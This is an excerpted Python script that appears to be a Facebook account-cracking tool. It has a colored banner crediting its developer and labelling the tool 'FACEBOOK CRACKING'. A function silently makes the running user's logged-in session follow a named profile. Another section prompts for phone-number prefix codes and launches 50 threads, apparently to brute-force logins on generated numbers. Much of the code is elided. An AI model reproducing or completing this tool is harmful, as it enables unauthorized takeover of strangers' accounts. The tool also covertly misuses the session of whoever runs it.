...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=CEO.Admin.Arman.Tremux.Group', {
...
[1;92m••●●●●●○○○○○●●●●●○○○○○●●●●●○○○○○●●●●●○○○○○●●●●●○○○○○••[1;92m
[1;92m[•_•] [1;92mDEVOLPER   :          ARMAN KING [1;92m          
[1;92m[•_•] [1;92mFACEBOOK   :          MD ARMAN HOSSAIN  [1;92m          
[1;92m[•_•] [1;92mGITHUB     :          Arman-king-2023[1;92m           
[1;92m[•_•] [1;92mTOOLS      :          FACEBOOK CRACKING[1;92m   
[1;92m••●●●●●○○○○○●●●●●○○○○○●●●●●○○○○○●●●●●○○○○○●●●●●○○○○○••
    """) 
loop = 0
oks = []
...
def xxr():
    ...
    os.system("clear")
    print(logo)
    code = int(input(f' [{xr}^{x}] Example>: {xr}019,017,018,92302,92301,91778{x}] \n\033[1;92mPut code : '))
    print(" ══════════════════════════════════════════")
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR WIFI + DATA ')
